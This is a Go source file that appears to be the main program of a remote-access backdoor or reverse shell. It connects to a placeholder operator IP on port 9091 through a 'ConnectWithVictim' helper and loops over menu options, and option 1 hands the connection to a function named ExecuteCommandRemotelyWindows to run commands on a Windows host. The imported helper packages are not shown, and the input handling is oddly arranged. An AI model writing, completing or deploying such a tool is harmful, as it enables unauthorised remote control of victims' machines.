package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"
	"tidy/core/ExecuteCommandWindwos"
	"tidy/core/handleConnection"
)

func options() {
	fmt.Println("[1] Execute Command")
	fmt.Println("[99] Exit")
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func options2() {
	fmt.Println("[1] ExecuteCommand")
	fmt.Println("[99] Exit")
	fmt.Println()
}

func main() {
	var connection net.Conn

	IP := "your ip address"
	PORT := "9091"

	connection, err := handleConnection.ConnectWithVictim(IP, PORT)

	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established with ", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {
		options2()
		fmt.Printf("[+] Enter Option ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(user_input_raw))

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Command Execution program")
			err := ExecuteCommandWindwos.ExecuteCommandRemotelyWindows(connection)
			DisplayError(err)
		case user_input == "99":
			fmt.Println("[-] Exiting the windows program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid option, try again")

		}
	}

}
